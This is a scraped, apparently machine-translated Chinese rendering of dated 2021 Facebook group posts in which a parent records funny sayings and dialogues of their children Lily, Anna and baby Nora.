href="https://www.facebook.com/groups/2264685517005985/posts/3409100872564438/?__cft__%5B0%5D=AZXzgIoqcK5M3OwgOR9MVxdNqEAvGtGpvOez7CQXAmvCWRQua_6J9ZdbMAYJ5pCSVaFcqWxKO68kdbPTC3tErWwQgcohdLIuddxGcfPf7vQRCOC9u963SuSzltf5EB6c2m2kZy9u65kGU73wGGQiLAmmF2REtZ0rZ9R5m9qV5154Y8xr8PbrFT0Iu5xJ_DsNyn4&amp;__tn__=%2CO%2CP-R">2021-03-07</a><p>莉莉和她的泰迪熊一起安顿下来过夜：“妈妈，你知道我喜欢小熊的什么吗？首先，他很柔软，可以拥抱。其次，他是顶级掠食者，所以如果怪物是真实存在的，我觉得他就像是”会保护我的。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3416500431824482/?__cft__%5B0%5D=AZX7BB3PaWyFkIQzOP_DU0Q1ENiOwlgRWpZJqs6CMhychicRAcgdgypJarBj7cNAgTS0tfFbDNkA5ZD-1McUe8BybOWNYR1wgwrRgWJbduwaq3YR9jy566yzrCVUCaQIfbi7PdPQFQ3hMhJLebRUw4t_q2g0j92wJdVUByDCoxLR44_3udcGoP661i_kmxJ6NaA&amp;__tn__=%2CO%2CP-R">2021-03-16</a><p>安娜：“妈妈，你能唱这首歌吗？晚上有一场激烈的战斗，当太阳升起时，他很高兴，因为他看到了国旗。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3416815488459643/?__cft__%5B0%5D=AZW7s6v7p7yi2sWK2eB1Zkf5jpccK-O3knzWEErNKyT5EHaK_VZdQkNwHcNmMG3_a9_v5Ai2ame4p0gUs2PmwWNsA1Rf8zO1qb3RsuFT21p0D3BwixWte6bYPfMioz5GjoGpqyVpj3VM1D9X65xZM7U_5P1m5hftoJ8ECfrqgz3TEjrR3vXQ7FY-aHwZJR0e2Bc&amp;__tn__=%2CO%2CP-R">2021-03-17</a><p>安娜：“你为什么不给我做早餐？”</p><p>我：“你还没告诉我你想吃什么吗？”</p><p>安娜：“我确实告诉过你了！”</p><p>我：“我不记得了？”</p><p>安娜：“好吧，我已经告诉过你了！”</p><p>我：“你能再告诉我一次吗？</p><p>安娜：“我不会重复自己的话”</p><p>我：“抱歉，什么？”</p><p>安娜：“我不会重复自己的话！”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3432561346885057/?__cft__%5B0%5D=AZUuyMGl2f_uQHXFRe_Ao1k4nusIesEEpBiSBTW8IDAjW5Lh4QEpEHKmib7J9HOfFEeYvDxV2SvfAKBJpNbztRqipi-88TqynI5bH2iX1jZGgrZU9gODpzupMz5QPJ0LGTQGy7277Nh0vuQ6_0c8nWSuuQT6SG4gais-Pn0YCkIfnIE1hbDbEeVoFYZpQsAuZ4o&amp;__tn__=%2CO%2CP-R">2021-04-05</a><p>当安娜生气时，她所说的“事实”就变得不那么真实了。今天早上我用她的零用钱帮她订了一个玩具，她问什么时候到。 “一两周后。”</p><p>安娜愤怒了：“一周？！一周就是一年！严格来说，是两年。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3438309399643585/?__cft__%5B0%5D=AZV8qmZUuTXkfYoXeqasm5RRg-igwilZa1NMXbtGC98rM9HJQHveEj0OqK3y9Xf-Gi5ggjTDhmmFIWeXqMLnDWrcPi2bXIwJwwDGHLjEn4iDfzNKP62jyMgYnzb1BgdJJgT2LuH86BehB0PAWGc_w7Lx9XHJ6NojWp5ELgHimR0CE8-GzNGNo8qWX2OW59u2i44&amp;__tn__=%2CO%2CP-R">2021-04-12</a><p>莉莉：我最大的两个愿望是能够飞翔和冠状病毒从未到来</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3454695144671677/?__cft__%5B0%5D=AZVk2SOi1wLGI7rAqQ0kuQ6UosVU-9iOdU_wqZpmkMYUOCve7IdwALzR5JOcS5tdCpuvfLSVdHpZhYMzpDOo4sgOeA1jOYk-sGgfdjnKMTt-D0uPPMsuA-pCC1OvW5rlL2mCCgOdN96p2NbvnHvhJGZSrVAQTLndnfZtUQCrBCw1SR1Kv_ToBilg8eF5ok8gJPUhom4PHrS8L8Qej17igXns&amp;__tn__=%2CO%2CP-R">2021-05-02</a><p>朱莉娅：“如果我们抛硬币，硬币正面朝上，那么会发生什么？”</p><p>安娜：“然后我们再翻转一次，如果它落在尾巴上……”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3455696511238207/?__cft__%5B0%5D=AZUr1Kr9rtGiPFicl8urmJuJh4LkKjHc-tep9ckEc9BAax7FGVuKxGZzxihW1cfQroUdr3JOVRBziGQX_4l-DKs-2rSkLwWWB_Xa7tjEt0NEZ9F-PKX_lEQWtWrvd7jy8sDBNb7OQXF_7Xvb10aa1V3v_kw53TXHdm1Hw1aw-5DYbZOrpO9-OSQ0a2oMWDW3hQI&amp;__tn__=%2CO%2CP-R">2021-05-03</a><p>莉莉：我害怕卧室里有蚊子；我想他们会咬我</p><p>安娜：蚊子不咬人，它们吸你的血</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3456857877788737/?__cft__%5B0%5D=AZUbFps-eHw2gIh8ORg_xcyAaqM2FXtbCKP9ydMDULNxyNJFyVJFP_2e_YITMWyPvqfUTv_0Bip2XUZ5XYR7wc87FeW5lwjEyD6dh2UzOtSPmEflevSh0795QQrSVqNPgI6T5ExuwgSSSbe1GC26c1kNT2INl0U3BEO5JIstLR85pD0ojzyB3Y_yw6vOeFIg1HY&amp;__tn__=%2CO%2CP-R">2021-05-05</a><p>莉莉：我想吃一些培根，但我是素食主义者</p><p>我：由你决定</p><p>莉莉：我要不再吃素了。</p><p> [吃一块]</p><p>莉莉：好吧，我现在又开始吃素了</p><p>...</p><p>安娜：“森林里最好的事情就是有很多动物，你可以捕捉并杀死它们。然后吃掉它们。这让你非常健康。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3459497774191414/?__cft__%5B0%5D=AZW7F8LiR5Jk_Qq_joUuEh3-cpGy2YZUcGstDw_38cN4kEji8voOKnz3jNp1mieEqbqTyH7GqTlWnCZ6WoDt097-2x5eHroMfgIFsiaB5GvclllaQR4kwzKNrL6AXB8gnJQP_vAfhxq8AYu4fNJVKH8oZQPkkpx4oTNDBJg69OVbdfQe4e5vOdC_AOa8XQQY7cI&amp;__tn__=%2CO%2CP-R">2021-05-08</a><p>我们刚刚玩了一场玩家别无选择的游戏，莉莉击败了安娜。莉莉对此感到非常难过，并试图让安娜感觉好一点。</p><p> “安娜，你赢了比赛，在我心里”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3463696547104870/?__cft__%5B0%5D=AZXAOaQSOTtmfStevaaNIUxY8z6tk61UTH-4HPU-hdy_qk2sMxj8AZ2CnFL9PRodlrf9yWdijiYdY2Iidta0iCzzORWWWB5Z0s9x_if2uX99lXpKFGejh2KsaNosOb2iIOzEMDdZHaB9Sl4gtpZpZY93DgaL4HkmLmGoaEj4-O4Y8UlXgslrkelZUVTyVjBkPtg&amp;__tn__=%2CO%2CP-R">2021-05-13</a><p>莉莉：“昨天我亲自回学校了！耶耶耶耶耶耶”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3465988893542302/?__cft__%5B0%5D=AZX9BYMKBwZ4m_Kz2y9CDrdvfgp80pza80lBc5QuafGSxLjSdzTEv0mWPozoh7r2_vSyl95S64vqfXbehoaB0wzr-rvlXpEDoJCUBHmZJZv6x0FQo5_ZVRlCtQd3DDULaYKfpFHtU6_eI1Xciqgidu32TeNvmcT-eQToUsljIYb-pGAD_uweyBCjmV00dRgmaII&amp;__tn__=%2CO%2CP-R">2021-05-16</a><p>今天孩子们装饰饼干的两集：</p><p>安娜：你是个傻瓜。</p><p>莉莉：什么是原发？</p><p>安娜：这是一个不会说话的痘痘。它为在你脚趾里生长的婴儿提供食物。</p><p>后来，孩子们伸手去拿桌子的同一部分，安娜为莉莉锦上添花。</p><p>莉莉：嘿！</p><p>安娜：抱歉，但这是你的错。</p><p>我：你不必说那部分。如果你撞到某人，你可以说：“哎呀，对不起。”</p><p>安娜：哎呀，对不起，莉莉。 ……但这是你的错。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3470715839736274/?__cft__%5B0%5D=AZVsGY-sZ14qVJS_8KaoyS8kgBXECi57v2THDc7dFB9NTjkg3JO8Y8CbIDUEgC3nXaapdZLuBKVUXneHG9yiwhiPXnMBmfWCSBcG34BFAa_vh3inLvPhExTFbYj3CvB3sV6MFHw8A1BkkEBWcCzA5llnlqKWA-YF9M4_Er7eCKzh8_7J2XxZqnaLv2AnQu4jd0k&amp;__tn__=%2CO%2CP-R">2021-05-21</a><p>孩子们制作了徽章以在不同的心情下佩戴。</p><p>安娜：“这是我快乐的徽章。这是我疯狂的徽章。这是我悲伤的徽章。这是我喜欢的大米徽章。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3476159479191910/?__cft__%5B0%5D=AZUa2Pxnx1YhYOQVCKHdepG6rZe6WX_RjEWQyYsxWq3OmGWjMMy9ME8euycNt0fqJrSJAyJgVSiSboJnpuJ2ZMxAenP-oFEBgSTLnoocMHjzPAokr0AGO54TGv5XnK5cQLWehS6QssyK3jPWjMCHkcZkdBV0nqyRw08QV-UACif3_eyD8P6wVbcx52Is8lTO37A&amp;__tn__=%2CO%2CP-R">2021-05-28</a><p>安娜：“妈妈，你没关我的灯电池！”</p><p>朱莉娅：“你房间里的灯实际上并不是用电池供电的，而且灯消耗的电量足够少，所以非常便宜”</p><p>安娜：“但是它会产生温室气体！”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3481335735340951/?__cft__%5B0%5D=AZXLgIAc_aMqMTvYmQz5Jwx-wznPjYhoMCJE7izwFYX2_octtK5webNH-Xn2ocQWtIS8466lrD-3ZvniHxq5v1_Y_9qxpnkGTO3H7bBI2p289IXSFqrpesuJ9ukeyDmDejozOHDNS4YZ3ngFla5vIyF-N69PLYAChak6vj8g8U9k0O1wvNDUfr_1EhszM_u3dMU&amp;__tn__=%2CO%2CP-R">2021-06-03</a><p>我：安娜，这扇门上有红色蜡笔。</p><p>安娜：我不知道它是怎么到那里的。</p><p>我：我需要你把它清理掉。</p><p>安娜：（一分钟后，擦掉）楼下的墙上也有蓝色。</p><p>安娜：（三分钟后，把它擦掉）我只是想让它看起来像壁纸。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3487913761349815/?__cft__%5B0%5D=AZUq9BJ7nJeFtg32vS8Nv4kqzNrHZjsQF5UYT3t9L-GqKPPKj0T1U9Ri-zrOWhaXIZV4DSYlW1J062ihdPHwZoLrW8R8GO1w0gJL8a3eTbb624MGoJwUIeZW9ESTIFplsgZSecn1Kh8xkjHxA_ZIugpN6JOm0MpuDMtvHgqp-8dgDSsezLrk-TE3OYWJDymfinQ&amp;__tn__=%2CO%2CP-R">2021-06-12</a><p>安娜：如果大树林里的小房子在威斯康星州，劳拉和玛丽戴奶酪帽吗？还是妈妈或爸爸？</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3492377694236755/?__cft__%5B0%5D=AZXFTAVM4JgBiC6cE1tbj_gzOnd4bqZPT9wxG86G3GdTMC8Ul8GPbOlYPEK_yatgrGX7D2hyVY3Hg_eclV11TSVn2Zd_CAU-oi8FDsqvRNYaKfhEhRG82aBgaUSNMNCkZZec4ge1VU267cOllTRA42mHDSjLV6RvOx0GTgToq_XfV9cVT-4v3JPJdqU3B2_Co-Q&amp;__tn__=%2CO%2CP-R">2021-06-17</a><p>莉莉，非常真诚地对诺拉说：你是我的小妹妹，我是你的大姐姐，无论发生什么，我都会永远在你身边。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3494771063997418/?__cft__%5B0%5D=AZXXtjyAQ0xtk-4qrzz10ZUEn-FEatPAqZ_XfQY5bX6oQb1zvqf-kUIVhjyJZClD7q57F28F-ty024WI4jIweuPD_OhTvm9GCRR2yOFSv9szsLeeTUDp5ITEXxN-TnIdyn-8jCIvp2FEeEB3B-T0ogwrTLn2-RtqliSFaBYJ1MTqEzKJJhpgd47VSzHLPf0FV3I&amp;__tn__=%2CO%2CP-R">2021-06-20</a><p>莉莉昨天：[唱了一首戏剧性的歌曲，讲述她感觉诺拉正在接管她的生活]</p><p>莉莉今天：“我希望家里最小的专家来跟我说晚​​安”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3496398123834712/?__cft__%5B0%5D=AZXM6ROl5xJo9Eq1N6sN_CyOJ5aMdFUhPDiS8Blo-F_xbuS8SSiD8foCBets9oi5quhysgcrBMuw3FXfd74oGB46UOcqYQz7VtV-HKSiG69TogwEwPGZ_XhVrPUimucNZe5vl3iuNRnwWJEhjrlYRf1kIL3o2H0HLC-Kk-UvDjwiVcVUOVG7ERrBq9f0vbJtGqU&amp;__tn__=%2CO%2CP-R">2021-06-22</a><p>莉莉：安娜向我扔了一个硬塑料球！</p><p>安娜：我只是向她扔了一个球，让她知道我的感受</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3499714696836388/?__cft__%5B0%5D=AZXNsSCufZWXevm74Pl1ceNXJHB9NIzhO-ir5DTH9WnR63R2yYyH1ESLNp0EmIsPfnYszByb20dET0xaMSFPsYzOQViRL6EdAndSkqg3nPtUNs719qi523lpBcwEndyj7pnbxk1I7UUWuXAKCjiMepd9X6qEFYKJ9GNljKaAQm1OV0FSCmk2mTuUgIyAZPtMkv0&amp;__tn__=%2CO%2CP-R">2021-06-26</a><p>莉莉病了，今天我们要让大孩子远离婴儿。两人都在门口徘徊，觉得很为难。</p><p>安娜：“昨晚我告诉诺拉关于细菌的事情，她决定我拥抱她就可以了。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3501177203356804/?__cft__%5B0%5D=AZV7ty2_IWH8Eq4PYbFuqxUNlBZbj9PUtT0uJ3xLFRgTJ1raRgijSSNKj8swWp-Q8jkozph4qlxQYmjtZausHlHCJ3PvB_wFnNH1Pmh7RDIdCfy7MN4eGsQmL1ah3i-gRpl-jeFCQWLNfvPQG_w2LguuPqKAdtaxzv-wob70VmZrK_jmBcyHbsNWPhPVBCfcHgY&amp;__tn__=%2CO%2CP-R">2021-06-28</a><p>安娜：“我不喜欢覆盆子和生奶油下面突出的圆形部分”</p><p>我：“你是说煎饼吗？”</p><p>安娜：“不，我喜欢煎饼，只是不喜欢底部。你能给我做一个只有巧克力片、覆盆子和鲜奶油的煎饼吗？”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3506343262840198/?__cft__%5B0%5D=AZWjeuIJepzGzyFUGOxwb5mU916nVRnTVqD336LtxtjjT7qc88RhrwMX6P-SiE1r_ADbYvraOOTnIGkDi7kgBpiHl4ABYH6sALMbWkZv66UXFytIIUBSl1oWlsniTCnhuOZBLakniXEnf0dU8AjMT5YDWGW4oowbsVc9NExkHIsn9xgXelEL8B2PT_EA44NOuC0&amp;__tn__=%2CO%2CP-R">2021-07-04</a><p>阅读理解贝特西。安娜评论道：“弗朗西斯阿姨认为她是一个好父母，但她并不是一个好父母。她教贝特西害怕狗，并告诉她她永远不需要自己做任何事情，而且别人不需要做任何事。”永远都会为她做一切。”</p><p> “事情需要你自己做吗？”</p><p> “是的，有些东西，但其他东西太高了，我够不到，或者我不知道我们把东西放在哪里，然后有人可以提供帮助”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3508506349290556/?__cft__%5B0%5D=AZVF_xBvwSG82ef3YJdImNwzdgUh7fYl2k-rEIdXrGI0VRX_DghRloR4v_F8uh6jaxJD1UWfIhosVb34Rpzjx6xSFKy1zPMFTSaGCalOlCQNmXYi2tsV8di7fxnhGgfhXccmu9IJLAWD6dALU18TUSbrfUWHPbnbKs3rMzSQVD41lxdnQCapYPUKDEmw1BEmToM&amp;__tn__=%2CO%2CP-R">2021-07-07</a><p>安娜：“我的胃感觉很奇怪，就像我生病了一样”</p><p>我：“是不是因为你刚刚在公园玩了半个小时的回合？”</p><p>安娜：“不”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3509513339189857/?__cft__%5B0%5D=AZW0huLPm-MuFsxOpTPpjrvLaeObok7lcTvpppzbL6cKqvfHXdZ4KTGiYWH0dgyNPuP775NI4twUMJT3BOvglvK1RdcsAwwi3pesdyFCSTbLSAjWENWjJCiuHwkUz4pADfWWLkIcL15OAkZYZxcHICT7oy4WpXK1EK3Pqb9kAotb2Wz3N_GeEkm1CoZdK1MtSPo&amp;__tn__=%2CO%2CP-R">2021-07-08</a><p>安娜：我正在冒险拥抱。当你拥抱的人变得格外活跃和活跃时</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3517303495077508/?__cft__%5B0%5D=AZUlCMSVwADM7SvUq2Qo8XD0zoSg78-ML7bNoMqx_ipBUjAxzdYhcR84mHNyLhceJAds5ObVWUo18Z4vjRqHtdidbXeSK2l7r9V3efheqtxyNRRGl6lvaYOBMUV8SQaRDfBnmoXPbYgaAet8j1h81fMpL4fC1YErJd8ILI5YEXiye0LOa6FGie-n-jG-JJyq9ls&amp;__tn__=%2CO%2CP-R">2021-07-18</a><p>放下婴儿小睡后，这并不是您想在监视器上听到的内容：</p><p>安娜：[声音特别高]该叫醒诺拉了，我想和你一起玩！我们要玩这么多！诺拉诺拉诺拉！</p><p> [之后]</p><p>安娜：“我没有叫醒诺拉。我只是希望她能醒来并想和我一起玩。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3520067291467795/?__cft__%5B0%5D=AZWugKhpYD5INXGAFC6Hg0xsmq1Wtls1nmE9m6qYes9AFFa89WA_WXJ9MV2VQ-7SYJccDpKaBV0VyjrAzJ1PZK1LAM3RHKJZaiktnijpJmcjXd_nMbm1xiSrjq0CcRefoYozNFzobr07PzUrlToGwvpzRvFw0BpnCirompzQzffX6r7LpdxQt26NkxTna8bNR-w&amp;__tn__=%2CO%2CP-R">2021-07-22</a><p>安娜：种子是怎么来的？第一颗种子从哪里来？因为那个必须来自同一种植物的另一种。</p><p>莉莉：安娜，这可能会让你感到惊讶，但是：大爆炸。</p><p>安娜：我只是想让妈妈查一下。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3528072394000618/?__cft__%5B0%5D=AZUSsN4PcBsP4HfGcIzMWGClAP4ul6m60dupIukYUpH8DUttJWodcFvPbpUfFRIf6MW5Vc2PrLhZf_GsTXuSmhfy39FvoJwzuMHpeaBEfBZ6E5hU45L4LA6mHY8SkTTwkBV4eUx3zFXN_m_fzmng5rpwj5WlSHWKAOhr5KtKSwxBRQHsn63x8zzGRVqEjpRIhgc&amp;__tn__=%2CO%2CP-R">2021-08-01</a><p>来自安娜在依偎期间的声音：</p><p> “诺拉从头到脚都是婴儿做的。”</p><p> “诺拉就像一只鸭子，潜入水中寻找鱼、小鱼和面包屑，然后把它们从池塘底部吃掉，然后狼吞虎咽。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3530156747125516/?__cft__%5B0%5D=AZWSoU1dsm7FbKG2tm3KBWM3sEZuddr2-3CvCkpV9ew473tx4LlqJoY0-2OTfrTk4p5MLM6SkHH0_MKc1W2WAeWVTS0HSrhQPh4dkQjVWZJl7V-cWgFKnpwlz5mtATGY4tD-ialSvQmP0E4SPsKTYVJwkGIQdWR5cj8lmJaBGKBFgr5NJMCSKh_WG9sMNj660zo&amp;__tn__=%2CO%2CP-R">2021-08-04</a><p>安娜对她最喜欢的主题的更多评论：</p><p> [向诺拉展示一些点的图片]“诺拉就像一位科学家看着化石并试图找出化石的来源。”</p><p> “诺拉像菠萝一样大。”</p><p> “诺拉的鼻子是由器官和皮肤制成的。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3530433907097800/?__cft__%5B0%5D=AZUHxXUTkh3aGaYcbBPfz2S80Khsxj9LlyLk3dy7Zkj8GR-rBtmhYNexWtwGe-ko2I02O02gRyYWKbfmSqnf6WmrdmE1Ocgk_g-XI6KlDYmVdYEwqeTcIfyAkR0xqbNGJ7vMXnDbgXZksaESWS5OECeiDSZEDg2ZZydiI06P_orEO0hbuevz19kuJGTSD5jNx4o&amp;__tn__=%2CO%2CP-R">2021-08-04</a><p>莉莉：“安娜，记住，一个女孩最好活在真理的话语下，而不是说谎。”</p><p>安娜：“好吧，我做到了”</p><p> （当我在墙上发现蜡笔时，我不再试图弄清楚谁需要清洁它，因为总是安娜。但莉莉直截了当地问她“是你做的吗？”所以安娜否认了一切。）</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3537226889751835/?__cft__%5B0%5D=AZWhCWdr4dnYISnM-cOL7Kzswjc-NXC4b4Es-Tm3ZAcLiTGBR_FfPa8kjLADnCDBxDfvOnUeFN6e3up6x4VSx70VWeaq9Vj1KgBAYZDLwYMpOnq2btCTSQ7jLy4P2PP3NrYfhtluS8dtosO6nmIfHI3PajXkKrgi3N_tTtaHwi8njokCGuJt34jRldaXuEE0dcc&amp;__tn__=%2CO%2CP-R">2021-08-12</a><p>莉莉：“安娜，你猜三个谜语怎么样，如果你全部猜对了，我就不再是狗了。准备好了吗？汪汪汪，汪汪汪汪汪汪，汪汪汪汪汪汪汪。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3539241072883750/?__cft__%5B0%5D=AZVGAaZJ3F1TrIcM16ssTUmKA52cRnZ5JDuoOhA92JK8BUUun-eldkxqJs3bCjumHkxO2IqcL8D_5aS07RtglNeQ8jc132AUbzzu01bHHMPKIO1963sl8pwBa2eL1gVLeyAiVgo5m_qDPFEz5UJqkQ4ZHDDK43cOFywpsKutXKI1wu32tLpdNXjOnuVbKh9RBdk&amp;__tn__=%2CO%2CP-R">2021-08-15</a><p>安娜：莉莉，你不用表现得那么厉害</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3540357286105462/?__cft__%5B0%5D=AZUAqUqEPBHmy2kXOASeva-f5BXotVHdWJai_u9ph01-jCBYUNBsAt_ZyWbuFcLW4Gox2kkUrczzAfx6TZW1qZlFGe_uQ1_hKkmd4UYD-tTuk8RWnSe5fdc-fbrNf67AjgXJQE9SQ-zvXOb86zMjEPIQ6a54XkzqrzlJeyDdAvXD8sKAtFcdr9XjqTTT87ABRJA&amp;__tn__=%2CO%2CP-R">2021-08-16</a><p>安娜：[关于诺拉脚趾的长篇独白的一部分]……这是最好的脚趾。</p><p>我：是什么使它成为最好的脚趾？</p><p>安娜：因为当你到达那里时，那里有闪亮的灯光和一张大桌子和漂亮的椅子。桌子很漂亮，上面还挂着一盏枝形吊灯。有一条隧道从她的头顶一直延伸到她的腿和脚趾，这就是你到达那里的方式。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3543389482468909/?__cft__%5B0%5D=AZWe4lueZTWmAPH8QC3DeLmBVBlFEsCb7er-EFleSfz6dRe2Tzrs1JYBWjyK4YCuvENsbaBszQ9klWP7txepSyc14fnzHePAHwE_tUZMdu2GoL9JuJTKAQcYG0ZBRTf1NKW9YaAbFXuhjmry03gxnqJl3xSqikcutsEKFJLnKqu9gjxBmTwGZF_CrwLmmiguRxs&amp;__tn__=%2CO%2CP-R">2021-08-20</a><p>我：这个周末我们应该在飓风中航行吗？</p><p>安娜：不会。因为会有白色的帽子，它们会进入船内，从而使船沉到我们的脚触不到底部的地方，而我们的头却露出水面。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3577388495735674/?__cft__%5B0%5D=AZUThmE4R-t1q6U03sO5vQAtCTmD67ZIcRjWG8LkLxHnliYB9dKo5aIrIswadLhpcUbGkTmO2ArKhW8zPgcAfdPF4oUPZFWLPyssFczcWF0D0Hd8WigA-9BLw5tlg0WbMKr6jgc5kY8kBwN-nwUrTbKlKSSPaCheeG0OjcWl8s70Idhm6cLcKSEdizGCJJ1Y8Kg&amp;__tn__=%2CO%2CP-R">2021-10-03</a><p>莉莉：对我来说，得到诺拉的拥抱就像得到一份礼物一样好</p><p>安娜：对我来说，得到诺拉的拥抱就像[被诺拉分散注意力]一样好，就像诺里诺里可爱的诺里一样！</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3582792991861891/?__cft__%5B0%5D=AZV_u40tpKdn9Cb_wTsuZSEn_ARasNSnLv7o89MGVnc8KDNt9GQFVkOkdAc-Y0zUJTDTVOE959sfgnuUVRmOtjpo0R1FM40zwYdfkBFYdMNEgsYTqrMcqQS-eoEWiHo_W845bZSPAgOMKSYcyj0tFJl-hh8QaRL9ivt1xg6HHU_4HTaHKk8KIUcmnzZ49q5TvdM&amp;__tn__=%2CO%2CP-R">2021-10-21</a><p>安娜：“当你不知道如何阅读时，有一个回文名字非常方便。因为这样你就不会遇到任何问题。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3587586118049245/?__cft__%5B0%5D=AZU5uE8Li6RIEDIDpDRV6fY4k7HwI2A_iFGts17AUPw1E48KNEcIXUPkXya3xj7Q4O7P8kiXF0vjDUghTIHyEsudGuR_nVhZrAg3ptL-SlRrObr6zrzVHNY3A86p-pKP2Sax5CeX3oJfeDXD7wb2KDjisUcTROL99zCbCNYDTuYnWLbHsKxs3agGAoPkPL-lo8s&amp;__tn__=%2CO%2CP-R">2021-10-16</a><p>安娜：我不是鸡做的，我是人肉做的</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3592987174175806/?__cft__%5B0%5D=AZUIBVHZmvo0IQIcJ21JF7nQg0bO3alZe85atgUGeVkh35TE_pui1IQKklBmuuQdOzURAjte49pAlick0L2QmM8kX5KNV9u3PtnfaTubrLvkm37e286ROzxoJeFg33Rnq8buAMjMlDVVyKmtkPGqZiOhEo3_I0WAHZQtGD4AYMgPhIlGm1Ro-HEKJPq3JVH0XsI&amp;__tn__=%2CO%2CP-R">2021-10-23</a><p>我：[把泡打粉放进煎饼里]</p><p>莉莉：你把那些东西放进我的食物里了吗？</p><p>杰夫：是的……</p><p>莉莉：你总是把它放进去吗？</p><p>杰夫：是的，它是发酵粉，它使它们蓬松</p><p>莉莉：爸爸！你知道我是个素食主义者！</p><p>杰夫：“发酵粉”，喜欢用来烘烤。它不是由培根制成的。</p><p>莉莉：噢，好的。我还以为是猪呢</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3593018160839374/?__cft__%5B0%5D=AZUfOL24oqCJo3xNQAQO4ScYdDHT1e8b2mhjWnkN66u1kw_cDtIjidGdUvFOd-t6hI7hLY9Fg7bQRuQu9a88SSBt7-DIZtj4ygmw_T5AOdcGNny2eJiRzgCr9yxQHunF97ff0aYoh9YD2B6sVHdAq_R3sWSZm4qfKZZ6v7VYUuo74tqqvnkXdHc2pIB-G5rlWIw&amp;__tn__=%2CO%2CP-R">2021-10-23</a><p>安娜：当鸭嘴兽不知道婴儿的名字时，它们会称婴儿为“宝贝小姐”，无论其性别如何。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3593879140753276/?__cft__%5B0%5D=AZVQnhwhIxfPv-iHICzveLmf-Ce68DFPxYVzdNOlz_UM1TTFC_kjwEmlCikUdf5qcFkeJPROIMSUBm143uvgVMrAAv5CRvH9-Q7xTkmw0XR2iqHojwNSmmGmYQXZASw26saAuP4I_dzcg9O-Yl7ctDAlfmmukTbdg4wor3i-A5CyxCJRRCSqRGn62zJ3irUI6Wk&amp;__tn__=%2CO%2CP-R">2021-10-24</a><p>安娜：“你不用催我，杰菲！那只会让我压力更大，而我已经有 20% 的压力了！”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3602271109914079/?__cft__%5B0%5D=AZWtG1RQHyZBUjMZGdYn7FRzji5XXsKM4XS1v6BwVDF-7qQWm-7J9Euho4Yjl6CLflT7aXULVJP35kRDCQmpmDbmiNnBuqK92N8R8Uy-1D_CYrRwZ4i_pBCmu5Uor-CROD3ULGmzY94K0fqTXLJ594GZCV2jov9Iv253Iysbfnu9jK-M4IJ4fJJzJ7S1mUk2A3w&amp;__tn__=%2CO%2CP-R">2021-11-03</a><p>安娜：我永远不想成为青少年。我想快点到20岁。</p><p>我：你为什么不想成为青少年？</p><p>安娜：我不想对人刻薄。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3607761386031718/?__cft__%5B0%5D=AZV-UPZr16prWgQ1Jy8PNHeA065kgZeGK-244dIy9ayURuaxgyJgzcQc60Y2u3TuK1S2K8A26rnLeKT4sjzjRSBfmMiWoVpVAKICSj4YvSKAweTogs6SIRJ9LetHoYKRcsDG4aUhvDJUp8RyPM1rWjhCSXD8EBZcpTWt5_dsCZauz0tyB5l1bjM_Ya0dAOVDnZM&amp;__tn__=%2CO%2CP-R">2021-11-10</a><p>莉莉：这个有多甜？</p><p>杰夫：你觉得怎么样？</p><p>百合：一整颗甜</p><p>杰夫：好的。这是否意味着你不想要妈妈做的苹果派？</p><p>莉莉：实际上是甜的3/4</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3610288725778984/?__cft__%5B0%5D=AZWhDB-W6_T4tQOXNHsUpnYaEyORAPpl8fHQvAgH7rGgFxYmOSru8hIIdusWi0AjNgym0RUagq6IqOUYfbowz_x6UoNQluAkOWZcXOtPnNGubWJXl4xmPWK7uX6NIU8UkwUYHRxzA8bdwAqqDKcRq_ru6itTO8DAww7U-9dpcb8NuWG0em_eUrGUnD34CtttvPk&amp;__tn__=%2CO%2CP-R">2021-11-13</a><p>安娜：你违反了规则。我说过我的房间里不要有任何触摸的东西。</p><p>莉莉：你违反了规定！你正在触摸东西。</p><p>安娜：不，因为我是政府。</p> <a 